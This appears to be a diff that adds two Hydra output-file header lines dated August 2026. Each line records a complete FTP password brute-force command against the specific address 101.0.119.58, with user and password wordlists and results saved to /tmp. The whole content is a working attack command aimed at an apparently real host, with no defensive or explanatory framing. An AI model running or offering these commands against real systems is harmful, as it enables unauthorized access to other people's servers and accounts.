@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-08-10 06:32:45 on 101.0.119.58 ftp (hydra -L /opt/msray/users.txt -P /opt/msray/pw_mega.txt -t 3 -W 6 -f -o /tmp/brute_ftp_101.0.119.58.txt ftp://101.0.119.58)
+# Hydra v9.2 run at 2026-08-10 06:36:44 on 101.0.119.58 ftp (hydra -L /opt/msray/users.txt -P /opt/msray/pw_mega.txt -t 3 -W 6 -f -o /tmp/brute_ftp_101.0.119.58.txt ftp://101.0.119.58)
